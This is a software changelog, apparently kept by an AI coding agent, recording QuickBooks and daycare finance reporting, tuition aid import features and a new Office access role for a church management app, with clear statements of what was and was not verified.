- **This Year / Multi-Year toggle** in the Church Report (mirrors the existing Attendance-by-Service Date-Range/Multi-Year toggle pattern): This Year shows Total Income/Total Expenses/Net Income summary cards with budget-remaining and a simple over/under progress bar (only when budget data is known — honestly shows "No budget data" rather than a misleading $0 otherwise), a ChMS-giving reference line captioned per the user's own framing ("QuickBooks reflects what has cleared the bank and been fully recorded"), and a collapsible full account-detail table reconstructed client-side from the flat rows (`finBuildTreeFromFlatRows()` — the client-side mirror of the server's bottom-up rollup math). Multi-Year keeps the existing year-by-year table, now sourced from the persisted table instead of the live blob cache. Both retain the existing daycare tie-in reference lines and Print/Export CSV buttons.
- **A real bug caught while building `finBuildTreeFromFlatRows()`**: the first version looked up each row's immediate parent only by its immediate path prefix, but a pure grouping label with no own posting (e.g. "Job Materials", which never gets its own stored row) creates a "gap" in the path — the naive lookup treated the gap's children as false roots and silently dropped them out of every ancestor's rollup total. Fixed by walking up ALL ancestor path prefixes to find the nearest one with a stored row; caught by a Node harness reproducing the exact real-data shape, re-verified correct afterward.
- **Verified**: `npm test` (58/58, including 21 new tests: `flattenReportTree`/`persistChurchEntries`/`resolveChurchYearPrecedence`/`computeYearSummary`, the latter two backed by real-SQL integration tests against an in-memory D1-shaped SQLite database running the actual migration DDL, not a hand-rolled mock); `node --check` on all touched backend files and all 3 built `<script>` blocks; a Node harness `eval()`'d the actual served frontend script and exercised the full toggle/render/CSV-export flow against realistic fixture data, including simulating a post-sync `loadFinance()` re-run to confirm the cache-invalidation fix actually refetches instead of showing stale data. **Not verified**: an actual live QuickBooks sync (still blocked by the 5020 Permission Denied error pending Intuit) or a real browser. (`migrations/0018_finance_church_entries.sql`, `src/db.js`, `src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `test/finance-church.test.js`)

### 2026-07-17 (v1.26.1 — FIX: reconstructed Budget vs Actual lost QuickBooks' categorization and silently merged same-named accounts across categories)
- **Reported** against the v1.24.4 fallback path (used when QuickBooks' own BudgetVsActual report endpoint returns the "5020 Permission Denied" error — see FIN2): the user compared the reconstructed report to a real "Budget vs. Actuals" export from the sandbox company and found (1) every account listed alphabetically in one flat list instead of QuickBooks' real Income/Cost of Goods Sold/Expenses categorization with proper nesting, and (2) Income appeared to be missing entirely.
- **Root cause was worse than lost formatting**: `buildBudgetVsActualFallback` flattened the real (correctly nested) ProfitAndLoss report tree into a `Map` keyed only by each account's bare leaf name, discarding all Section/parent context. The real sandbox company's chart of accounts has two genuinely different sub-accounts both named "Plants and Soil" — one under Income → Landscaping Services → Job Materials, one under Expenses → Job Expenses → Job Materials — so the flat map silently overwrote one account's actual/budget figures with the other's. Confirmed against the user's uploaded real export (`Budget vs. Actuals__Budget_FY26_P&L___Report.xlsx`), which shows the exact real category structure this needed to reproduce.
- **Fixed**: rewrote the merge to work directly on QuickBooks' own ProfitAndLoss row tree — recursively injects a matching Budget-entity amount into each leaf/Section row in place (`mergeLeafCells`/`mergeSection`/`mergeTree` in `src/api-finance.js`) instead of flattening anything, so Income/COGS/Expenses sections, nesting, and subtotals ("Total for X") all match QuickBooks exactly, and Income is included because it was never actually separate data — it's the same tree the (unaffected) Church Report feature already renders correctly. Subtotals are derived bottom-up (a section's own direct-posting budget, if any, plus every descendant's budget) rather than by trying to name-match "Total for X" labels, which don't appear verbatim in the Budget entity. Top-level running-subtotal rows (Gross Profit / Net Operating Income / Net Other Income / Net Income) are computed the same two-thread way QuickBooks itself computes them (Income+COGS+Expenses accumulate together; Other Income/Other Expenses accumulate separately and only merge back in at Net Income) rather than name-matched, since they're derived figures with no account of their own.
- **Same-name collision safety net**: budget amounts now merge by account name only when that name maps to exactly one account ID across all `BudgetDetail` lines (a single account legitimately has one line per month — that's not a collision); a name genuinely shared by two different accounts in different categories now shows $0 budget rather than merging their numbers, with a warning listing which names were ambiguous.
- **Verified**: built a Node harness replicating the real uploaded export's exact structure byte-for-byte (including the real "Plants and Soil" collision) plus a synthetic multi-month Budget entity, and confirmed: the Income section survives in the output, the two colliding accounts both correctly show $0 budget with a warning instead of merged/wrong figures, unambiguous multi-month accounts (12 monthly lines, same account ID) correctly sum without a false collision flag, nested subtotals compute correctly bottom-up (spot-checked against the real export's own subtotal numbers), and the two-thread Gross Profit/Net Operating Income/Net Other Income/Net Income math matches hand computation exactly. `npm test` (37/37), `node --check`. **Not verified**: an actual live QuickBooks sandbox re-sync (still blocked by the underlying 5020 Permission Denied error pending Intuit's response) — this fix is only exercised against synthetic data faithfully modeled on the real export the user provided. If the live fallback still looks wrong after Intuit's ticket resolves (or the fallback keeps being needed), the user's suggested plan B — export the real Budget vs Actual report from QuickBooks as Excel and import it into ChMS directly — is a reasonable fallback to build instead. (`src/api-finance.js`)

### 2026-07-17 (v1.26.0 — FEAT: Church Report + Daycare Report, board-level year-by-year views)
- **Requested** after the daycare finance sync was verified working end-to-end (156 line items synced): the raw flat sync table isn't something to hand a church board — needs a summarized, year-by-year view, separate for church (QuickBooks) vs. daycare, with a few daycare lines (income total, wages, expenses) surfaced inside the church report for context, and both on-screen and printable/exportable.
- **Finance tab restructured** into 3 sub-tabs (reusing the existing Volunteers-tab sub-nav shell/CSS — `.vol-subnav`/`.vol-subtab-btn` already used standard app tokens, no new CSS needed for the shell itself): **Overview** (unchanged QuickBooks Connection/Budget vs Actual/Account Balances cards, plus the daycare sync control — the full 156-row flat table is now tucked behind a `<details>` disclosure instead of always shown), **Church Report**, **Daycare Report**.
- **Daycare Report**: year-by-year table (calendar year, one column-pair — Actual/Budget — per year) grouped by category, with Total Income/Total Expenses/Net Income summary rows. Computed entirely client-side (`finAggregateDaycareByYear()` in `js-finance.js`) from the same daycare rows already fetched for the Overview tab — no new backend endpoint needed. "Tuition Income" is treated as the sole income category; everything else (including any future/manual category) is an expense.
- **Church Report**: QuickBooks' own multi-year Profit & Loss report (`summarize_column_by=Year`), rendered with the same generic Columns/Rows tree-walker already used for Budget vs Actual. Reuses the `profitAndLoss()` client method the concurrent QuickBooks-fallback work (v1.24.4) also added to `quickbooks.js`; `finance/qb/sync` now additionally fetches a 5-year trailing P&L window (separate call, `summarize_column_by=Year`) and caches it in `finance_qb_snapshot` under `profit_and_loss_by_year`; `finance/overview` returns it. Three daycare tie-in lines (Daycare Tuition Income / Daycare Payroll (Wages) / Daycare Total Expenses) are appended below QBO's own totals, explicitly labeled "for reference, not part of QuickBooks totals above" and matched to QBO's year columns by parsing the 4-digit year out of each column's title — they are never summed into QuickBooks' own figures, since the two systems track genuinely separate books.
- **Print/export**: each report card has a Print button (`window.print()` — print CSS extended so `#tab-finance` joins `#tab-reports` in the print-visible allowlist, and the Overview panel + sub-nav rail are force-hidden when printing so only the active report shows) and an Export CSV button (client-side CSV build, reusing the existing Excel-formula-injection guard pattern from `exportGivingDiagnoseCsv` in `js-reports.js`).
- **Rebased onto v1.24.3/v1.24.4** (the QuickBooks Budget-vs-Actual fallback work, which landed on `main` while this was in progress) — both `profitAndLoss()` client methods were added independently to the same spot in `quickbooks.js`, kept as one (identical signature/behavior); the `finance/qb/sync` handler now runs the fallback-vs-actual logic and the new multi-year P&L fetch as two independent steps.
- **Verified**: `npm test` (37/37); extracted and `node --check`'d all 3 built `<script>` blocks; a standalone Node harness `eval()`'d the actual served script and called `finAggregateDaycareByYear()`/`finRenderDaycareReport()`/`finRenderChurchReport()`/both CSV export functions directly against hand-built sample data (confirmed correct income/expense/net totals, correct per-category Payroll figure for the wages tie-in line, correct QBO-column-to-year matching, and that both CSV exports run without throwing). **Not verified**: an actual browser, and real QuickBooks P&L data (no live QBO connection in this session) — the next real "Sync Now" click will populate `profit_and_loss_by_year` for the first time. (`src/quickbooks.js`, `src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `src/frontend/html-head.js`)

### 2026-07-16 (v1.24.4 — QuickBooks sync: fallback path when Budget vs Actual report is blocked)
- **Context**: the sandbox's "5020 Permission Denied" error on the `BudgetVsActual` report endpoint persisted through every self-service fix (verified Budget exists and renders correctly in the QuickBooks UI, confirmed Primary Admin, tried an Advanced-plan sandbox company, full disconnect/reconnect). A support ticket was filed with Intuit with the `intuit_tid`s and error code, but there's no ETA on a response.
- **Built an automatic fallback** (`src/api-finance.js` `buildBudgetVsActualFallback`, `src/quickbooks.js` new `budgets()`/`profitAndLoss()` client methods): when the `BudgetVsActual` report call fails, the sync now tries reconstructing the same comparison from two other endpoints — the raw `Budget` entity (`SELECT * FROM Budget` via the Query API, giving budgeted amounts) and the standard `ProfitAndLoss` report (actuals) — on the theory that entity-level Query API access and other reports may not share whatever permission restriction is blocking this one specific report. Matches rows by account name, sums each account's `BudgetDetail` line items for the year, and synthesizes the same Columns/Rows report shape the frontend already renders generically (no frontend table-rendering changes needed) — with a visible amber note in the Finance tab explaining the numbers were reconstructed and are year-to-date totals, not a monthly breakdown.
- **⚠ Schema uncertainty flagged honestly**: the exact `Budget` entity field names (`BudgetDetail`/`AccountRef`/`Amount`) are based on Intuit's published documentation, but Intuit's docs site blocked automated fetching while building this, so the schema could not be directly confirmed against a live response. The row-matching/aggregation algorithm itself was verified against synthetic QBO-shaped test data (multi-month budget lines summing correctly per account, actuals correctly extracted from both nested Section rows and flat rows) — but whether the real `Budget` entity response matches the assumed field names is unverified. If this fallback also returns nothing useful, check a real `SELECT * FROM Budget` response's actual shape against what's read in `buildBudgetVsActualFallback` and adjust.
- **Verified**: `npm test` (37/37), `node --check`, and a standalone Node harness exercising the matching/aggregation algorithm against synthetic multi-month budget + nested/flat P&L data.

### 2026-07-16 (v1.24.3 — QuickBooks sync warnings now include the Fault error code)
- **Context**: live sandbox testing (FIN2) hit a real QuickBooks error on Budget vs Actual — `Permission Denied Error: To access this, sign in again or contact an administrator` — after ruling out both obvious causes (a Budget for the requested year does exist; the connected user is the company's Primary Admin). QBO's structured `Fault.Error[]` response includes a specific numeric `code` classifying the error, which `fetchQboJson()` (v1.23.3) already captured in the server-side `console.error` log but never surfaced in the warning shown in the Finance tab UI.
- **Fix**: the visible warning now includes `error code ###` alongside the HTTP status and `intuit_tid`, so the specific QBO error classification is visible without digging through Cloudflare logs.
- **Verified**: `npm test` (37/37), `node --check`. Diagnosis of the underlying Permission Denied error itself is still open — needs the error code from a re-sync to pin down further.

### 2026-07-16 (v1.24.2 — FIX: daycare finance client sent requests to the wrong URL)
- **Context**: the daycare app's Claude Code session finished building its finance endpoint and handed over the real values — `DAYCARE_API_URL` = a complete Supabase Edge Function URL (`https://<project-ref>.supabase.co/functions/v1/finance-summary`), `DAYCARE_API_KEY` = same value as that app's own `FINANCE_API_KEY`.
- **Bug found while wiring it up**: `src/daycare.js`'s `makeDaycareClient()` treated `DAYCARE_API_URL` as a base domain and appended `/api/finance/summary` to it (matching the original SECRETS.md placeholder example, `https://daycare.timothystl.org`) — but the daycare app's actual endpoint is that complete, specific Supabase function path, not a fixed route on a conventional host. With the original code, every sync request would have gone to `.../finance-summary/api/finance/summary`, a 404. Fixed to fetch `DAYCARE_API_URL` directly with nothing appended.
- **SECRETS.md updated** with the real, as-implemented contract: `accounts` is always `[]` (no bank/checking data on the daycare side — balances stay manual-entry only in ChMS), `budget` covers 13 months (current + 12 prior) across 6 categories (Tuition Income, Payroll, Payroll Taxes, Workers Comp, Other Payroll Expenses, Other Expenses), and a known limitation that Payroll actuals can run slightly high for months after a staff departure (no termination date tracked on the daycare side).
- **Verified**: `npm test` (37/37), `node --check`. Still needs `DAYCARE_API_URL`/`DAYCARE_API_KEY` set as Worker secrets and a real "Sync Daycare App" click to confirm end-to-end (FIN3).

### 2026-07-16 (v1.24.1 — FIX: QuickBooks OAuth callback always failed with "Unauthorized")
- **Reported** during live sandbox testing (FIN2): clicking "Connect QuickBooks", completing Intuit's consent screen, and being redirected back to `/admin/api/finance/qb/callback` always produced `{"error":"Unauthorized"}` — reproducible even immediately after a fresh login, ruling out session expiry.
- **Root cause**: the `vol_auth` session cookie (`src/auth.js`) was set with `SameSite=Strict`. Intuit's redirect back to our callback URL is a cross-site-initiated top-level navigation — `SameSite=Strict` cookies are never sent on exactly that kind of request, so the callback arrived with no session cookie at all and failed the app's normal auth gate. This is precisely why virtually every OAuth-integrated web app uses `SameSite=Lax` rather than `Strict` for its session cookie; this app had never had a feature that redirected an admin off-domain and back before, so the gap was never exercised.
- **Fix**: `vol_auth` changed to `SameSite=Lax`. Still blocks the cookie on cross-site subresource/POST requests (the actual CSRF risk); the OAuth flow itself is separately CSRF-protected via the single-use, KV-stored `state` parameter (already built — see FIN1). The member-portal cookie (`tlc-member`, `src/api-member.js`) was left untouched — it has no OAuth-style off-domain redirect flow, so `Strict` is correct there.
- **Verified**: `npm test` (37/37), `node --check`. This is exactly the kind of gap the FIN2 "needs live verification" note called out — it could only be found by actually completing a real OAuth round-trip, which this environment couldn't do; the user's live sandbox test caught it on the first real attempt.

### 2026-07-17 (v1.25.0 — Tuition Aid Planner: import history now captures Outside Aid/Timothy Award per year)
- **Requested**: right after v1.24.0 shipped, user's coworker rebuilt the "Student Tuition History" sheet to also include Outside Aid and Timothy Award per year (previously only had a single family-owed total per year), and the user re-uploaded it.
- **New sheet shape**: same sheet name TAP10 already recognized, but each year is now a 5-column group — Grade / Tuition Billed / Outside Aid / Timothy Aid / Family Owed — with the year label merged across the group one row above the column headers, instead of one "Parent YYYY-YY" column per year.
- **New `tapDetectMultiYearHistoryLayout()`/`tapExtractMultiYearHistory()`**: finds the year-group columns by scanning the row above the header for `YYYY-YY` labels and validating the sub-headers at each match; reads whichever field actually has a number (a `'?'` sentinel — the source file's own convention for "enrolled but the split isn't confirmed" — is simply omitted rather than guessed, while the grade is still recorded if that alone is known). Tried first on a "Student Tuition History" sheet; falls back to the original single-column-per-year format (TAP10) if the new group columns aren't found, so older-style uploads still work unchanged.
- **New reconciliation check**: flags (non-blocking, still checked by default) any year where `tuition − outside aid − Timothy award` doesn't equal family owed. This caught a real problem in the user's re-uploaded file: Hawkins/John and Hawkins/Michael have *identical* 2019-20 figures — almost certainly one brother's row got copy-pasted onto the other during the coworker's reconstruction. Surfaced with the actual numbers in the import preview (amber highlight, distinct from the red identity-collision highlight from v1.24.0) so the user can decide which figure to trust rather than the tool guessing.
- **Verified**: ran the real re-uploaded workbook through the actual served code — all 8 year groups detected, current year (2026-27) correctly excluded (0 leaked), 26 students / 85 entries imported with grade + aid populated, Oschwald/Jadon figures match what TAP12 already cross-verified against the original workbook, `'?'`-flagged fields correctly omitted while grade is kept, all 7 reconciliation mismatches (including the Hawkins duplicate) correctly flagged without blocking. Re-ran the TAP12 raw-workbook-parser harness against the original file too, confirming no regression to that code path. `npm test` (37/37), `node --check` on all touched files and all 3 built `<script>` blocks.
- **⚠ Not verified**: an actual browser (same standing caveat as TAP12/TAP10 — no live browser in this environment).

### 2026-07-16 (v1.24.0 — Tuition Aid Planner: import the real award workbook directly, LHS awards included)
- **Requested**: user uploaded the school's actual working award-tracking workbook (`Tuition_Awards_2026.xlsx` — one sheet per school year) and asked whether it would work as-is, whether grade would be captured, and whether the Timothy-funded grants (Partnership/Access/Soldiers of the Cross) would be totaled separately from outside scholarships. None of that was true of TAP10's simple "Student Tuition History" ledger format (family/child/amount-owed only).
- **Built a second importer path instead of asking for a hand-reformat**: `tapParseWorkbookAllSheets()` parses every sheet in the uploaded file; `tapDetectAwardSheetLayout()` finds the header row by exact cell text ("Last Name"/"Grade"/"Child"/"Parent Portion…") rather than a fixed column position, since the offset differs by year (some years have 2 extra leading payment-plan columns); `tapYearLabelFromSheetName()` reads the school year off the sheet's own tab name ("26-27" → "2026-27", "Timothy Member Tuition 2022-23" → "2022-23"). Column classification: Today & Tomorrow/Building Blocks/CFNA/Other/MO Scholars/LASE Scholarship/ACE sum into **Outside Aid**; Partnership Grant/Access Grant/Soldiers of the Cross sum into **Timothy Award** — verified against the real file that `tuition − outside_aid − timothy_award = family_owed` holds exactly across sampled rows, confirming the split is correct rather than guessed.
- **LHS awards included**: each sheet has a separate high-school block with no "Last Name" column, so those rows are found by anchoring on a "LHSA Aid" total row and scanning upward while grade reads 9–12 (reusing the same column positions detected from the K-8 header — verified the award figure always lands in the "Partnership Grant" column position for that block too). Matched to students by name against the **current roster** (per the user's explicit choice when asked, since the source data has no last name for these rows) — tries a full "First Last" match first, falls back to first-name-only; anything unresolved (0 or 2+ candidates) is listed in the import preview rather than guessed.
- **Only 4 of the 8 sheets are recognized**: `26-27`, `2025-26`, `Timothy Member Tuition 2023-24`, `2022-23` share the clean one-row-per-child layout the parser understands. The 3 oldest sheets (`2021-22`, `2020-21`, `2019`) use an incompatible one-row-per-family-with-multiple-children shape and different column names — these are skipped and named in the import status message rather than parsed incorrectly.
- **Caught a real data-quality issue while testing**: two different real students in the user's own file are both named "John Hawkins" — one currently K-8 (grade 8), one currently LHS (grade 12). Name-only matching would have silently merged their entire histories into one record. Added a post-merge check: if a matched family+child name has a K-8-shaped entry and an LHS-shaped entry landing on the *same school year*, that's a strong signal of two different people sharing a name — the row is highlighted and left unchecked in the import preview with an explicit warning instead of importing blind.
- **Backend** (`src/api-tuition-aid.js` `import-history`): previously only ever wrote `family_owed_cents`. Now merges whichever of `grade`/`outside_aid_cents`/`timothy_award_cents`/`family_owed_cents`/`lhs_award_cents` a given entry provides against the existing per-(student,year) row — same merge-preserving pattern already used by the `year-pins/bulk` endpoint — so a K-8-only or LHS-only re-import can never wipe out the other kind of data already recorded for a different year on the same student.
- **Backward compatible**: the original simple "Student Tuition History" sheet format from TAP10 is checked first and still works unchanged; the new raw-workbook parser only runs if that sheet isn't present in the uploaded file.
- **Verified**: ran the real uploaded workbook through the actual served (`String.raw`-processed, extracted-and-`eval()`'d) code — 62 K-8 history entries and 16 LHS entries extracted across the 4 recognized sheets, several dollar totals spot-checked by hand against the source cells, the Hawkins/John collision correctly caught, zero negative amounts, the 3 legacy sheets correctly skipped and named. `npm test` (37/37), `node --check` on all touched files and all 3 built `<script>` blocks.
- **⚠ Not verified**: an actual browser, and the LHS name-matching logic against the *real* current roster (only tested against a small hand-built stand-in roster, since this environment has no live D1 database) — worth a careful look at the import preview on the first real run, particularly any "unresolved" or collision-flagged rows.
- **Rebased past v1.22.1–v1.23.4** (Office role, Finance/QuickBooks tab, legal pages, QuickBooks OAuth discovery + error handling, Finance "Need help?" link — five sessions that landed on `main` while this was in progress): only conflicts were `js-core.js`'s `DEPLOY_VERSION` line (resolved to 1.24.0) and this changelog's insertion point.

### 2026-07-16 (v1.23.4 — Finance tab: "Need help?" contact link)
- **Requested** while filling out QuickBooks' Developer app questionnaire — one question asks whether the app provides a way for users to contact support from within it. Added a small "Need help with this tab? Contact the office." line (mailto link) at the top of the Finance tab.

### 2026-07-16 (v1.23.3 — QuickBooks sync: intuit_tid capture + structured error detail + logging)
- **Requested** while filling out QuickBooks' Developer app questionnaire (error-handling section: does the app capture `intuit_tid`, log errors for support, handle syntax/validation errors). New shared `fetchQboJson()` helper in `src/api-finance.js` wraps every Accounting API call in the sync handler: captures the `intuit_tid` response header (Intuit's own recommended field for support tickets), parses the structured `Fault.Error[]` body QBO returns on failure (message/detail/code) instead of surfacing a bare HTTP status, and `console.error`-logs the full detail server-side (visible via `wrangler tail`/Cloudflare dashboard) so a real failure can be diagnosed without reproducing it live. Warnings shown in the Finance tab UI now include the `intuit_tid` and the actual QuickBooks error message, not just an HTTP status code.
- **Verified**: `npm test` (37/37), `node --check` on `src/api-finance.js` and all 3 built `<script>` blocks. No live QuickBooks error response was available to test this against directly (same environment limitation as FIN2) — the Fault-parsing shape follows Intuit's documented error response format.

### 2026-07-16 (v1.23.2 — QuickBooks OAuth endpoints resolved from Intuit's discovery document)
- **Requested** while filling out QuickBooks' Developer app production-access questionnaire — one question asks whether the app uses Intuit's OAuth2.0 discovery document to get the latest endpoint URLs rather than hardcoding them. `src/quickbooks.js` now fetches `https://developer.api.intuit.com/.well-known/openid_configuration` (or the `_sandbox_` variant per `QB_ENVIRONMENT`) once per Worker isolate (24hr in-memory cache) and resolves `authorization_endpoint`/`token_endpoint`/`revocation_endpoint` from it. The previously-hardcoded URLs are kept only as a fallback if that fetch fails, so a transient outage on Intuit's discovery endpoint can't break the OAuth flow. `getAuthorizeUrl()` is now async (its one call site in `src/api-finance.js` updated to `await` it) — `exchangeCodeForTokens`/`refreshTokens`/`revokeToken` were already async, no signature change needed there.
- **Verified**: the discovery document's actual published values were confirmed to match what was previously hardcoded, so this is a pure robustness improvement with no behavior change today. `npm test` (37/37), `node --check`.

### 2026-07-16 (v1.23.1 — Public Privacy Policy + Terms of Use pages)
- **Requested** while setting up the QuickBooks Online Developer app for FIN1/FIN2 — Intuit's production-access form requires public Privacy Policy and Terms of Use URLs. New `src/legal-pages.js` (`PRIVACY_HTML`/`TERMS_HTML`), served unauthenticated at `/privacy` and `/terms`. Plain-language, honest about what TLC Gather actually does (internal staff tool; describes the Breeze/QuickBooks/daycare-app/Brevo/Resend integrations); not a substitute for the church's own legal review.

### 2026-07-16 (v1.23.0 — Finance Overview tab: QuickBooks Online sync + daycare app integration)
- **Requested**: a single place to see the church's finances instead of QuickBooks' large/cluttered reports — specifically Budget vs Actual and account balances — plus the daycare app's financial data (a separate Claude-Code-built app). Scoped like the Tuition Aid Planner: its own finance-gated tab (`admin`/`finance` roles).
- **QuickBooks Online** (`src/quickbooks.js`, `src/api-finance.js`): real OAuth 2.0 Authorization Code flow — admin clicks "Connect QuickBooks" in the Finance tab, completes Intuit's consent screen, callback exchanges the code for access/refresh tokens stored in a new `finance_qb_connection` table (not a Worker secret, since it's per-connection and rotates). "Sync Now" pulls the `BudgetVsActual` report and account balances (`Account` query) via QBO's Reports/Query API, caching the raw JSON in `finance_qb_snapshot`. The Budget vs Actual table renders QBO's own Columns/Rows report structure generically (recursing through Section/Data rows) rather than assuming fixed column semantics, since that varies by report params — this is the standard way to consume QBO's Reports API.
- **Daycare app integration** (`src/daycare.js`): the daycare app is a separate app (also Claude-Code-built) with no existing export/API, so two paths both land in the same `finance_daycare_entries` table (`source` column distinguishes them): (1) manual entry — always works, no dependency; (2) `POST /admin/api/finance/daycare/sync` pulls from `GET {DAYCARE_API_URL}/api/finance/summary` (shared-key auth) once that endpoint exists — see SECRETS.md for the exact contract handed to the daycare app's own Claude Code session. Sync wholesale-replaces only `source='daycare_api'` rows for the periods returned, never touching hand-entered rows.
- **New tables** (`migrations/0016_finance.sql`): `finance_qb_connection` (singleton), `finance_qb_snapshot` (cached report JSON, keyed), `finance_daycare_entries`.
- **ACL**: `seg.startsWith('finance')` gated `isFinance`-only in `api-chms.js` (matches Giving/Tuition Aid); connect/disconnect further restricted to `isAdmin` inside `api-finance.js` itself, since that changes which QuickBooks company the whole church reads from. Added to the `api-admin.js` ChMS-dispatch allowlist — this is exactly the line TAP2-BUG3 was caused by forgetting, so double-checked it's present.
- **New secrets** (SECRETS.md): `QB_CLIENT_ID`/`QB_CLIENT_SECRET` (Intuit Developer app credentials), `QB_ENVIRONMENT` (optional, sandbox/production), `DAYCARE_API_URL`/`DAYCARE_API_KEY` (optional, only needed once the daycare app implements the documented endpoint).
- **⚠ Needs live verification**: no live QuickBooks account or daycare app endpoint exists in this environment to test against. The OAuth flow, Reports API shape, and Query API were built against Intuit's public documentation but not exercised end-to-end — verify the full connect → sync → disconnect cycle in production once `QB_CLIENT_ID`/`QB_CLIENT_SECRET` are set, the same caveat pattern as BR3. Manual daycare entry has no such dependency and works today.
- **Verified**: `npm test` (37/37), `node --check` on all 3 built `<script>` blocks, byte-offset check that `#tab-finance` sits inside `.content-area` (same nesting mistake as TAP2-BUG/TAP2-BUG2).

### 2026-07-16 (v1.22.1 — New "Office" role: People/Households/Register data-entry access, no Giving/Reports/Settings)
- **Requested**: "can we set up different admin levels of what people can see? and have a user editor part like in the website." Clarified with the user: (1) a new fixed role tier rather than a full per-user custom-permissions rework, (2) named "Office/data-entry" — full People + Households + Register edit access, but no Giving/Reports/Settings. (The Settings → Users editor already existed — see AU1/LP10 — this adds a role to it.)
- **Backend ACL** (`src/api-chms.js`): new `office` role alongside `admin | finance | staff | member`. `canEdit` now includes `office` (People/Households/Tags/Funds/Organizations CRUD). New `canRegister` flag (`admin`/`staff`/`office`) gates the Register segment — split out of the old combined attendance/register/followup/audit `isStaff`-only block, since office needs Register but not the other three. New explicit block: `reports/*` returns 403 for `role==='office'` (attendance/follow-up/audit stay `isStaff`-only as before, unaffected). Config (Settings) reads stay open to any role as before (needed for the member-types dropdown used everywhere) — only writes are admin-only, so office is already excluded from making changes; the tab itself is hidden via CSS.
- **Person photo endpoints** (`src/api-people.js` `people/:id/photo` POST/PUT/DELETE) switched from `isStaff` to the new `canRegister` flag so office can upload/copy/remove a person's photo as part of full People editing. Bulk actions (`bulk-member-type`/`bulk-tags`/`bulk-sacrament`/`bulk-comm-opt`) and marking someone deceased were deliberately left `isStaff`-only — a narrower scope than full "staff", consistent with "office" being a data-entry role rather than a ministry-staff replacement. Revisit if this becomes a real friction point.
- **Frontend nav/CSS** (`src/frontend/html-head.js`): new `role-office` exclusions added to the existing `require-finance`/`require-staff`/`require-admin` marker-class rules (previously only finance/staff/member had exclusions defined per marker — a role added without its own exclusion row would default to *visible*, so this had to be explicit for every marker, not just the ones directly relevant to office). New `require-register` class (visible to admin/staff/office, hidden for finance/member) replaces `require-staff` on the Register nav item. New `no-office` class (parallel to the existing `no-member`) added to the Reports nav item.
- **`js-core.js`**: `showTab()`'s client-side guard updated to use a new `canRegister` local (was `isStaffPlus`-gated, blocking office from navigating to Register even though the API would have allowed it) — Reports stays gated on the existing `canEdit` local, which already excluded office (no change needed, verified this was already correct by not including office in that variable's definition). `applyRoleUI()` now clears `role-office` on role switch.
- **`js-dashboard.js`**: the dashboard "Reports" quick-action button was using the same `canEditRole` flag as "Add Person"/weekly-tasks/prayers/review-queue widgets — office needs the latter set but not Reports, so split into `canEditRole` (now includes office) and a new `canViewReports` (excludes office) used only for the Reports button.
- **Users editor** (`src/frontend/js-settings.js`, `src/api-admin.js`): `office` added to the role dropdown, the role-badge color map, and both `validRoles` allowlists (create + update).
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render with a mocked `role: 'office'` `/admin/api/me` response confirms exactly the intended sidebar set (Home/People/Households/Organizations/Register visible; Giving/Tuition Aid/Attendance/Reports/Volunteers/Scheduler/Settings hidden) and `document.body.className === 'role-office'`; a second Playwright pass confirms the Users editor's role dropdown includes "Office" and correctly pre-selects it when editing an existing office-role user.
- **Rebased past v1.20.0–v1.22.0** (five Tuition Aid Planner sessions — best-guess linking, historical import UI, Enroll/LHS-link/sortable-tables — landed on `main` while this was in progress): no file-level overlap beyond `js-core.js`'s `DEPLOY_VERSION` line and this changelog's insertion point, since the role work touches `api-chms.js`/`api-people.js`/`api-admin.js`/`html-head.js`/`js-dashboard.js`/`js-settings.js` while the concurrent Tuition Aid work stayed inside `js-tuition-aid.js`/`html-tabs.js`/`db.js`.

### 2026-07-16 (v1.22.0 — Tuition Aid Planner: Enroll button, LHS linking, sortable tables)
- **Three requests landed in one message**: an explicit "Enroll" action for pipeline kids ("a kid might be in the pipeline but not enrolled yet even if the right age"), linking LHS students to People records, and sortable table columns.
- **Enroll button (the real bug)**: `tapBucketFor()`/`tapActiveForYear()` treated a pipeline entrant as a genuine K-8/LHS student the instant their birth-year math said they were old enough — no actual "yes, this kid is enrolled" decision existed anywhere. That's backwards for a church school: families track a kid in the pipeline for years before deciding to actually enroll, and age eligibility isn't enrollment. Fix: new `tapEnrolledActiveForYear()` — identical to the original except it also excludes anyone still flagged `is_pipeline`, regardless of computed grade. This now backs every *operational* view: the planner tables themselves, the budget gauges, KPIs, Apply Aid Policy / Auto-Balance, the Pathway strip, the Composition pie chart, and the K-8 Detail table. Deliberately did **not** touch the Budget Projection or Enrollment Mix charts — those two are explicitly forward-looking, and counting anticipated pipeline arrivals in a 5-year budget projection is the entire reason pipeline tracking exists in the first place. A new "Enroll" button appears next to a pipeline chip once they're age-eligible; clicking it PATCHes `is_pipeline:false` + `base_grade:<their computed current grade>` — the only action that now moves someone out of the pipeline and into a real award-bearing roster row.
- **LHS "Link to Person"**: turned out the LHS row template never had a Link button at all — only K-8 rows did, seemingly an oversight from the original TAP1 build (LHS students were seeded with placeholder `family: '—'`, first names only, precisely because there was no way to attach a real Person record). Added the identical Link button/flow K-8 already had.
- **Sortable columns**: `tapRenderPlannerTables()` used to push HTML strings directly while iterating the roster — no way to reorder without a rewrite. Refactored to build an array of row data first, sort it by whatever column/direction is active, then render. Headers get their own `tapRenderPlannerHeaders()` pass with a ▲/▼ indicator on the active column, clicking a header a second time flips direction.
- **A design choice worth flagging**: the natural way to wire up 11 sortable column headers is `onclick="tapSortK8('family')"` — a quoted string argument embedded in generated HTML. That's exactly the escaping pattern that has caused real, hard-to-spot bugs earlier in this project (the scheduler's SC3-BUG1, and VUXBUG2's stored-XSS via a similar mismatch) — this file is a `String.raw` template, and getting the backslash count wrong for a quote inside a quote inside generated HTML is a one-character mistake that silently breaks a `<script>` block or worse. Sidestepped the whole risk class: 11 tiny dedicated wrapper functions (`tapSortK8Family()`, `tapSortK8Child()`, …) each call `tapSortK8('family')` from *inside real JS*, not from *inside a generated HTML string* — zero quote-escaping surface anywhere in the new code. Confirmed with `grep` that no `\'` sequences exist anywhere in the file after this change.
